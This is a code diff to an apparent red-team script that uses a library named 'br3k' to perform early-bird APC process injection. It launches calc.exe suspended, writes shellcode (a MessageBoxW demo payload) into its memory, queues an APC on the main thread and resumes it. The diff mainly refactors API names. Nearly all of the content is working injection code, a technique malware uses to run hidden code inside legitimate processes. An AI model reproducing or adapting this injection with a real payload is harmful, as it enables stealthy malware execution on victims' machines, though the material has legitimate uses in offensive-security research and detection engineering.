@@ -6,20 +6,22 @@
 # TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script
 
 import br3k
-from br3k import ProcessMemoryStrategy
+from br3k import ProcessVmStrategy
+
+IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"
 
 if __name__ == "__main__":
 
     print("Script: Inject via queue user APC (early bird)")
     print()
 
-    br3k.init_sysapi(ntdll_copy=True)
+    br3k.init_sysapi()
 
     shellcode = br3k.shellcode_get_messageboxw()
 
     process = br3k.Process(
-        image_path="C:\\Windows\\system32\\calc.exe",
-        memory_strategy=ProcessMemoryStrategy.AllocateInAddr
+        image_path=IMAGE_FILEPATH,
+        memory_strategy=ProcessVmStrategy.AllocateInAddr
     )
 
     process.create_user(suspended=True)
@@ -29,7 +31,8 @@ if __name__ == "__main__":
     ep = process.get_memory_remote_address()
 
     process.write_memory(data=shellcode)
-    process.thread_queue_user_apc(ep=ep)
-    process.resume_thread()
+    thread = process.main_thread
+    thread.queue_user_apc(ep=ep)
+    thread.resume()
 
     br3k.script_success()
